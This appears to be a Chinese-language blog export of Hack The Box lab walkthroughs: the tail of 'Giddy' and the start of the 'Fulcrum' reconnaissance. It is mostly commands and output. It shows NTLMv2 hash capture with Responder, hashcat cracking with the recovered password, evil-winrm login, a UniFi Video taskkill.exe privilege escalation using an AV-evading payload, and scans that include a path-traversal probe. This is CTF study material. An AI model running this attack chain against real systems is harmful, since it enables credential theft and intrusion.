class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazyinside:~/HackTheBox$ sudo responder -I tun0   <br>                                         __<br>  .----.-----.-----.-----.-----.-----.--|  |.-----.----.<br>  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|<br>  |__| |_____|_____|   __|_____|__|__|_____||_____|__|<br>                   |__|<br><br>           NBT-NS, LLMNR &amp; MDNS Responder 3.1.3.0<br><br>  To support this project:<br>  Patreon -&gt; https://www.patreon.com/PythonResponder<br>  Paypal  -&gt; https://paypal.me/PythonResponder<br><br>  Author: Laurent Gaffie (laurent.gaffie@gmail.com)<br>  To <span class="hljs-built_in">kill</span> this script hit CTRL-C<br><br><br>[+] Poisoners:<br>    LLMNR                      [ON]<br>    NBT-NS                     [ON]<br>    MDNS                       [ON]<br>    DNS                        [ON]<br>    DHCP                       [OFF]<br><br>[+] Servers:<br>    HTTP server                [ON]<br>    HTTPS server               [ON]<br>    WPAD proxy                 [OFF]<br>    Auth proxy                 [OFF]<br>    SMB server                 [ON]<br>    Kerberos server            [ON]<br>    SQL server                 [ON]<br>    FTP server                 [ON]<br>    IMAP server                [ON]<br>    POP3 server                [ON]<br>    SMTP server                [ON]<br>    DNS server                 [ON]<br>    LDAP server                [ON]<br>    RDP server                 [ON]<br>    DCE-RPC server             [ON]<br>    WinRM server               [ON]<br><br>[+] HTTP Options:<br>    Always serving EXE         [OFF]<br>    Serving EXE                [OFF]<br>    Serving HTML               [OFF]<br>    Upstream Proxy             [OFF]<br><br>[+] Poisoning Options:<br>    Analyze Mode               [OFF]<br>    Force WPAD auth            [OFF]<br>    Force Basic Auth           [OFF]<br>    Force LM downgrade         [OFF]<br>    Force ESS downgrade        [OFF]<br><br>[+] Generic Options:<br>    Responder NIC              [tun0]<br>    Responder IP               [10.10.16.3]<br>    Responder IPv6             [dead:beef:4::1001]<br>    Challenge <span class="hljs-built_in">set</span>              [random]<br>    Don<span class="hljs-string">&#x27;t Respond To Names     [&#x27;</span>ISATAP<span class="hljs-string">&#x27;]</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] Current Session Variables:</span><br><span class="hljs-string">    Responder Machine Name     [WIN-ADETZ3Y8WYX]</span><br><span class="hljs-string">    Responder Domain Name      [EW4R.LOCAL]</span><br><span class="hljs-string">    Responder DCE-RPC Port     [48071]</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] Listening for events...</span><br><span class="hljs-string"></span><br><span class="hljs-string">[SMB] NTLMv2-SSP Client   : 10.10.10.104</span><br><span class="hljs-string">[SMB] NTLMv2-SSP Username : GIDDY\Stacy</span><br><span class="hljs-string">[SMB] NTLMv2-SSP Hash     : Stacy::GIDDY:e37725686fbeb903:F5EA75E3874958C60E9A25EF30E749CC:0101000000000000001A65B6ACB1D801D9F9F88C677428680000000002000800450057003400520001001E00570049004E002D0041004400450054005A0033005900380057005900580004003400570049004E002D0041004400450054005A003300590038005700590058002E0045005700340052002E004C004F00430041004C000300140045005700340052002E004C004F00430041004C000500140045005700340052002E004C004F00430041004C0007000800001A65B6ACB1D80106000400020000000800300030000000000000000000000000300000C95EB283C25BD1671DBF9F855FFC7F09B14B85A0503F7FFCB402B0CE8AF1636E0A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310036002E003300000000000000000000000000</span><br><span class="hljs-string">[*] Skipping previously captured hash for GIDDY\Stacy</span><br><span class="hljs-string">[*] Skipping previously captured hash for GIDDY\Stacy</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazyinside:~/HackTheBox$ hashcat -m 5600 <span class="hljs-built_in">hash</span> /usr/share/wordlists/rockyou.txt <br>hashcat (v6.2.5) starting<br><br>OpenCL API (OpenCL 3.0 PoCL 3.0+debian  Linux, None+Asserts, RELOC, LLVM 13.0.1, SLEEF, DISTRO, POCL_DEBUG) - Platform <span class="hljs-comment">#1 [The pocl project]</span><br>============================================================================================================================================<br>* Device <span class="hljs-comment">#1: pthread-Intel(R) Core(TM) i5-10210U CPU @ 1.60GHz, 6857/13779 MB (2048 MB allocatable), 8MCU</span><br><br>Minimum password length supported by kernel: 0<br>Maximum password length supported by kernel: 256<br><br>Hashes: 1 digests; 1 unique digests, 1 unique salts<br>Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates<br>Rules: 1<br><br>Optimizers applied:<br>* Zero-Byte<br>* Not-Iterated<br>* Single-Hash<br>* Single-Salt<br><br>ATTENTION! Pure (unoptimized) backend kernels selected.<br>Pure kernels can crack longer passwords, but drastically reduce performance.<br>If you want to switch to optimized kernels, append -O to your commandline.<br>See the above message to find out about the exact limits.<br><br>Watchdog: Temperature abort trigger <span class="hljs-built_in">set</span> to 90c<br><br>Host memory required <span class="hljs-keyword">for</span> this attack: 2 MB<br><br>Dictionary cache built:<br>* Filename..: /usr/share/wordlists/rockyou.txt<br>* Passwords.: 14344392<br>* Bytes.....: 139921507<br>* Keyspace..: 14344385<br>* Runtime...: 1 sec<br><br>STACY::GIDDY:e37725686fbeb903:f5ea75e3874958c60e9a25ef30e749cc:0101000000000000001a65b6acb1d801d9f9f88c677428680000000002000800450057003400520001001e00570049004e002d0041004400450054005a0033005900380057005900580004003400570049004e002d0041004400450054005a003300590038005700590058002e0045005700340052002e004c004f00430041004c000300140045005700340052002e004c004f00430041004c000500140045005700340052002e004c004f00430041004c0007000800001a65b6acb1d80106000400020000000800300030000000000000000000000000300000c95eb283c25bd1671dbf9f855ffc7f09b14b85a0503f7ffcb402b0ce8af1636e0a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310036002e003300000000000000000000000000:xNnWo6272k7x<br>                                                          <br>Session..........: hashcat<br>Status...........: Cracked<br>Hash.Mode........: 5600 (NetNTLMv2)<br>Hash.Target......: STACY::GIDDY:e37725686fbeb903:f5ea75e3874958c60e9a2...000000<br>Time.Started.....: Tue Aug 16 20:18:49 2022 (1 sec)<br>Time.Estimated...: Tue Aug 16 20:18:50 2022 (0 secs)<br>Kernel.Feature...: Pure Kernel<br>Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)<br>Guess.Queue......: 1/1 (100.00%)<br>Speed.<span class="hljs-comment">#1.........:  2485.2 kH/s (2.24ms) @ Accel:1024 Loops:1 Thr:1 Vec:8</span><br>Recovered........: 1/1 (100.00%) Digests<br>Progress.........: 2695168/14344385 (18.79%)<br>Rejected.........: 0/2695168 (0.00%)<br>Restore.Point....: 2686976/14344385 (18.73%)<br>Restore.Sub.<span class="hljs-comment">#1...: Salt:0 Amplifier:0-1 Iteration:0-1</span><br>Candidate.Engine.: Device Generator<br>Candidates.<span class="hljs-comment">#1....: xamuraix -&gt; wykeisha</span><br>Hardware.Mon.<span class="hljs-comment">#1..: Temp: 71c Util: 77%</span><br><br>Started: Tue Aug 16 20:18:22 2022<br>Stopped: Tue Aug 16 20:18:52 2022<br></code></pre></td></tr></table></figure><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">stacy:</span>xNnWo6272k7x<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazyinside:~/HackTheBox$ evil-winrm -i 10.10.10.104 -u stacy -p <span class="hljs-string">&#x27;xNnWo6272k7x&#x27;</span>                                                <br><br>Evil-WinRM shell v3.4<br><br>Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() <span class="hljs-keyword">function</span> is unimplemented on this machine<br><br>Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm<span class="hljs-comment">#Remote-path-completion</span><br><br>Info: Establishing connection to remote endpoint<br><br>*Evil-WinRM* PS C:\Users\Stacy\Documents&gt; <br></code></pre></td></tr></table></figure><p>能走winrm不能走RDP。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">*Evil-WinRM* PS C:\Users\Stacy\Documents&gt; <span class="hljs-built_in">ls</span><br><br><br>    Directory: C:\Users\Stacy\Documents<br><br><br>Mode                LastWriteTime         Length Name<br>----                -------------         ------ ----<br>-a----        6/17/2018   9:36 AM              6 unifivideo<br><br></code></pre></td></tr></table></figure><p>这东西我去搜了一眼，它有个错误配置的漏洞，在启动和停止服务时，它会尝试加载并执行“C：\ProgramData\unifi-video\taskkill.exe”的文件。但是，默认情况下，此文件根本不存在于应用程序目录中。我只用生成一个木马放在制定位置即可，但是我并没有遍历服务的权限：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">*Evil-WinRM* PS C:\Users\Stacy\Documents&gt; reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysinstallElevated<br>reg.exe : ERROR: The system was unable to find the specified registry key or value.<br>    + CategoryInfo          : NotSpecified: (ERROR: The syst...y key or value.:String) [], RemoteException<br>    + FullyQualifiedErrorId : NativeCommandError<br>*Evil-WinRM* PS C:\Users\Stacy\Documents&gt; Get-WmiObject win32_service | Select-Object Name, State, PathName | Where-Object &#123;<span class="hljs-variable">$_</span>.State -like <span class="hljs-string">&#x27;Running&#x27;</span>&#125;<br>Access denied <br>At line:1 char:1<br>+ Get-WmiObject win32_service | Select-Object Name, State, PathName | W ...<br>+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~<br>    + CategoryInfo          : InvalidOperation: (:) [Get-WmiObject], ManagementException<br>    + FullyQualifiedErrorId : GetWMIManagementException,Microsoft.PowerShell.Commands.GetWmiObjectCommand<br>*Evil-WinRM* PS C:\Users\Stacy\Documents&gt; wmic service get name,displayname,pathname,startmode | findstr /i <span class="hljs-string">&quot;Auto&quot;</span> | findstr /i /v <span class="hljs-string">&quot;C:\Windows\\&quot;</span> | findstr /i /v <span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot;</span><br><span class="hljs-string">At line:1 char:121</span><br><span class="hljs-string">+ ...  findstr /i &quot;</span>Auto<span class="hljs-string">&quot; | findstr /i /v &quot;</span>C:\Windows\\&quot; | findstr /i /v <span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot;</span><br><span class="hljs-string">+                                                                       ~~~</span><br><span class="hljs-string">The string is missing the terminator: &quot;</span>.<br>    + CategoryInfo          : ParserError: (:) [Invoke-Expression], ParseException<br>    + FullyQualifiedErrorId : TerminatorExpectedAtEndOfString,Microsoft.PowerShell.Commands.InvokeExpressionCommand<br>*Evil-WinRM* PS C:\Users\Stacy\Documents&gt; <br></code></pre></td></tr></table></figure><p>传了个nc被windows defener干掉了。做了个免杀载荷，通过SMB传就行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazyinside:~/HackTheBox$ smbserver.py  share . -smb2support<br>Impacket v0.10.1.dev1+20220720.103933.3c6713e3 - Copyright 2022 SecureAuth Corporation<br><br>[*] Config file parsed<br>[*] Callback added <span class="hljs-keyword">for</span> UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0<br>[*] Callback added <span class="hljs-keyword">for</span> UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0<br>[*] Config file parsed<br>[*] Config file parsed<br>[*] Config file parsed<br>[*] Incoming connection (10.10.10.104,49716)<br>[*] AUTHENTICATE_MESSAGE (\,GIDDY)<br>[*] User GIDDY\ authenticated successfully<br>[*] :::00::aaaaaaaaaaaaaaaa<br>[*] Connecting Share(1:IPC$)<br>[*] Connecting Share(2:share)<br>[*] Disconnecting Share(1:IPC$)<br>[*] Disconnecting Share(2:share)<br>[*] Closing down connection (10.10.10.104,49716)<br>[*] Remaining connections []<br></code></pre></td></tr></table></figure><p>没权限查看服务路径，无所谓的，powershell可以很方便的读注册表曲线查询：</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs ada">UniFiVideoService              <span class="hljs-keyword">Type</span>            <span class="hljs-type">: </span><span class="hljs-number">16</span>                                                                                                                                                                                                      <br>                               Start           : 2                                                                                                                                                                                                       <br>                               ErrorControl    : 1                                                                                                                                                                                                       <br>                               ImagePath       : <span class="hljs-type">C</span>:\ProgramData\unifi-video\avService.exe //RS//UniFiVideoService                                                                                                                                        <br>                               DisplayName     : <span class="hljs-type">Ubiquiti</span> UniFi Video                                                                                                                                                                                    <br>                               DependOnService : &#123;<span class="hljs-type">Tcpip</span>, Afd&#125;                                                                                                                                                                                            <br>                               ObjectName      : <span class="hljs-type">LocalSystem</span>                                                                                                                                                                                             <br>                               Description     : <span class="hljs-type">Ubiquiti</span> UniFi Video Service<br></code></pre></td></tr></table></figure><p>服务太多了，显示不出来，咋就不能RDP呢，不过没关系,筛选路径去匹配：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs powershell">*Evil<span class="hljs-literal">-WinRM</span>* <span class="hljs-built_in">PS</span> HKLM:\system\currentcontrolset\services&gt; <span class="hljs-built_in">ls</span> | findstr <span class="hljs-string">&quot;unifi-video&quot;</span><br>                               ImagePath       : C:\ProgramData\unifi<span class="hljs-literal">-video</span>\avService.exe //RS//UniFiVideoService<br>*Evil<span class="hljs-literal">-WinRM</span>* <span class="hljs-built_in">PS</span> HKLM:\system\currentcontrolset\services&gt; <span class="hljs-built_in">ls</span> | findstr <span class="hljs-string">&quot;UniFiVideoService&quot;</span><br>UniFiVideoService              <span class="hljs-built_in">Type</span>            : <span class="hljs-number">16</span><br>                               ImagePath       : C:\ProgramData\unifi<span class="hljs-literal">-video</span>\avService.exe //RS//UniFiVideoService<br>*Evil<span class="hljs-literal">-WinRM</span>* <span class="hljs-built_in">PS</span> HKLM:\system\currentcontrolset\services&gt; <br><br></code></pre></td></tr></table></figure><p>这服务会自动重启，只需停止就行了：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">*Evil-WinRM* PS C:\ProgramData&gt; copy taskkill.exe \ProgramData\unifi-video\taskkill.exe<br>*Evil-WinRM* PS C:\ProgramData&gt; Stop-Service -Name Unifivideoservice -Force<br>Warning: Waiting <span class="hljs-keyword">for</span> service <span class="hljs-string">&#x27;Ubiquiti UniFi Video (Unifivideoservice)&#x27;</span> to stop...<br>Warning: Waiting <span class="hljs-keyword">for</span> service <span class="hljs-string">&#x27;Ubiquiti UniFi Video (Unifivideoservice)&#x27;</span> to stop...<br>Warning: Waiting <span class="hljs-keyword">for</span> service <span class="hljs-string">&#x27;Ubiquiti UniFi Video (Unifivideoservice)&#x27;</span> to stop...<br>Warning: Waiting <span class="hljs-keyword">for</span> service <span class="hljs-string">&#x27;Ubiquiti UniFi Video (Unifivideoservice)&#x27;</span> to stop...<br>Warning: Waiting <span class="hljs-keyword">for</span> service <span class="hljs-string">&#x27;Ubiquiti UniFi Video (Unifivideoservice)&#x27;</span> to stop...<br>Warning: Waiting <span class="hljs-keyword">for</span> service <span class="hljs-string">&#x27;Ubiquiti UniFi Video (Unifivideoservice)&#x27;</span> to stop...<br>Warning: Waiting <span class="hljs-keyword">for</span> service <span class="hljs-string">&#x27;Ubiquiti UniFi Video (Unifivideoservice)&#x27;</span> to stop...<br>Warning: Waiting <span class="hljs-keyword">for</span> service <span class="hljs-string">&#x27;Ubiquiti UniFi Video (Unifivideoservice)&#x27;</span> to stop...<br>Warning: Waiting <span class="hljs-keyword">for</span> service <span class="hljs-string">&#x27;Ubiquiti UniFi Video (Unifivideoservice)&#x27;</span> to stop...<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220816214441074.png" alt="image-20220816214441074"></p>]]></content>
    
    
    <categories>
      
      <category>Hack The Box</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Windows</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTB Walkthrough - Fulcrum</title>
    <link href="/post/HackTheBox-Fulcrum.html"/>
    <url>/post/HackTheBox-Fulcrum.html</url>
    
    <content type="html"><![CDATA[<p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/Fulcrum.png" alt="Fulcrum"></p><h4 id="Recon："><a href="#Recon：" class="headerlink" title="Recon："></a>Recon：</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">CrazyInSide:~/HackTheBox$ sudo masscan -p1-65535,U:1-65535 --rate 2000 -e tun0 10.10.10.62 <br>[sudo] crazyinside 的密码：<br>Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2022-09-03 00:25:25 GMT<br>Initiating SYN Stealth Scan<br>Scanning 1 hosts [131070 ports/host]<br>Discovered open port 9999/tcp on 10.10.10.62                                   <br>Discovered open port 4/tcp on 10.10.10.62                                      <br>Discovered open port 56423/tcp on 10.10.10.62                                  <br>Discovered open port 80/tcp on 10.10.10.62                                     <br>Discovered open port 22/tcp on 10.10.10.62                                     <br>Discovered open port 88/tcp on 10.10.10.62   <br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs bash">CrazyInSide:~/HackTheBox$ sudo nmap -sC -sV 10.10.10.62 -p4,22,80,88,9999,54623<br>[sudo] crazyinside 的密码：<br>Starting Nmap 7.92SVN ( https://ParrotOS.org ) at 2022-09-03 08:28 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 10.10.10.62<br>Host is up (0.30s latency).<br><br>PORT      STATE  SERVICE VERSION<br>4/tcp     open   http    nginx 1.18.0 (Ubuntu)<br>|_http-server-header: nginx/1.18.0 (Ubuntu)<br>|_http-title: Site doesn<span class="hljs-string">&#x27;t have a title (text/html; charset=UTF-8).</span><br><span class="hljs-string">22/tcp    open   ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)</span><br><span class="hljs-string">| ssh-hostkey: </span><br><span class="hljs-string">|   3072 48add5b83a9fbcbef7e8201ef6bfdeae (RSA)</span><br><span class="hljs-string">|   256 b7896c0b20ed49b2c1867c2992741c1f (ECDSA)</span><br><span class="hljs-string">|_  256 18cd9d08a621a8b8b6f79f8d405154fb (ED25519)</span><br><span class="hljs-string">80/tcp    open   http    nginx 1.18.0 (Ubuntu)</span><br><span class="hljs-string">|_http-server-header: nginx/1.18.0 (Ubuntu)</span><br><span class="hljs-string">|_http-title: 502 Bad Gateway</span><br><span class="hljs-string">88/tcp    open   http    nginx 1.18.0 (Ubuntu)</span><br><span class="hljs-string">|_http-server-header: nginx/1.18.0 (Ubuntu)</span><br><span class="hljs-string">|_http-title: phpMyAdmin</span><br><span class="hljs-string">| http-robots.txt: 1 disallowed entry </span><br><span class="hljs-string">|_/</span><br><span class="hljs-string">9999/tcp  open   http    nginx 1.18.0 (Ubuntu)</span><br><span class="hljs-string">|_http-title: 502 Bad Gateway</span><br><span class="hljs-string">|_http-server-header: nginx/1.18.0 (Ubuntu)</span><br><span class="hljs-string">56423/tcp open  http    nginx 1.18.0 (Ubuntu)</span><br><span class="hljs-string">|_http-title: Site doesn&#x27;</span>t have a title (application/json;charset=utf-8).<br>|_http-server-header: Fulcrum-API Beta<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>Service detection performed. Please report any incorrect results at https://ParrotOS.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 52.37 seconds<br>zsh: segmentation fault  sudo nmap -sC -sV 10.10.10.62 -p4,22,80,88,9999,54623<br></code></pre></td></tr></table></figure><p>端口4：</p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220903083048068.png" alt="image-20220903083048068"></p><p>点击之后会出现一个链接，看起来像文件包含：</p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220903083118664.png" alt="image-20220903083118664"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs bash">CrazyInSide:~/HackTheBox$ dirsearch -u http://10.10.10.62:4/         <br><br>  _|. _ _  _  _  _ _|_    v0.4.2<br> (_||| _) (/_(_|| (_| )<br><br>Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927<br><br>Output File: /home/crazyinside/.dirsearch/reports/10.10.10.62-4/-_22-09-03_08-32-57.txt<br><br>Error Log: /home/crazyinside/.dirsearch/logs/errors-22-09-03_08-32-57.<span class="hljs-built_in">log</span><br><br>Target: http://10.10.10.62:4/<br><br>[08:32:58] Starting: <br>[08:34:21] 200 -  312B  - /home.php<br>[08:34:24] 200 -  110B  - /index.php<br>[08:35:08] 200 -   54B  - /upload.php<br><br>Task Completed<br>                                                                                                                                                                                                                                                                                 <br>CrazyInSide:~/HackTheBox$ <br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220903083705795.png" alt="image-20220903083705795"></p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220903083616996.png" alt="image-20220903083616996"></p><p>不管上传什么都会失败。又枚举了半天疑似文件包含的参数，没什么收获：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs bash">CrazyInSide:~/HackTheBox$ wfuzz -w /usr/share/wordlists/dirb/big.txt -u <span class="hljs-string">&#x27;http://10.10.10.62:4/index.php?page=FUZZ&#x27;</span> --hh 110<br> /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz<span class="hljs-string">&#x27;s documentation for more information.</span><br><span class="hljs-string">********************************************************</span><br><span class="hljs-string">* Wfuzz 3.1.0 - The Web Fuzzer                         *</span><br><span class="hljs-string">********************************************************</span><br><span class="hljs-string"></span><br><span class="hljs-string">Target: http://10.10.10.62:4/index.php?page=FUZZ</span><br><span class="hljs-string">Total requests: 20469</span><br><span class="hljs-string"></span><br><span class="hljs-string">=====================================================================</span><br><span class="hljs-string">ID           Response   Lines    Word       Chars       Payload                                                                                                                                                                                                         </span><br><span class="hljs-string">=====================================================================</span><br><span class="hljs-string"></span><br><span class="hljs-string">^C /usr/lib/python3/dist-packages/wfuzz/wfuzz.py:80: UserWarning:Finishing pending requests...</span><br><span class="hljs-string"></span><br><span class="hljs-string">Total time: 0</span><br><span class="hljs-string">Processed Requests: 12902</span><br><span class="hljs-string">Filtered Requests: 12902</span><br><span class="hljs-string">Requests/sec.: 0</span><br><span class="hljs-string"></span><br><span class="hljs-string">                                                                                                                                                                                                                                                                                 </span><br><span class="hljs-string">CrazyInSide:~/HackTheBox$ </span><br></code></pre></td></tr></table></figure><p>端口80，目标是台linux，报的确实windows  .net错，可能是nginx在代理内网服务：</p><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220903084104707.png" alt="image-20220903084104707"></p><p>但是没东西：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash">CrazyInSide:~/HackTheBox$ dirsearch -u http://10.10.10.62 -e asp,aspx<br><br>  _|. _ _  _  _  _ _|_    v0.4.2<br> (_||| _) (/_(_|| (_| )<br><br>Extensions: asp, aspx | HTTP method: GET | Threads: 30 | Wordlist size: 9511<br><br>Output File: /home/crazyinside/.dirsearch/reports/10.10.10.62/_22-09-03_08-39-56.txt<br><br>Error Log: /home/crazyinside/.dirsearch/logs/errors-22-09-03_08-39-56.<span class="hljs-built_in">log</span><br><br>Target: http://10.10.10.62/<br><br>[08:39:57] Starting: <br>[08:40:38] 403 -  312B  - /\..\..\..\..\..\..\..\..\..\etc\passwd<br>[08:41:37] 200 -    5KB - /index.htm<br><br>Task Completed<br>                                                                                                                                                                                                                                                                                 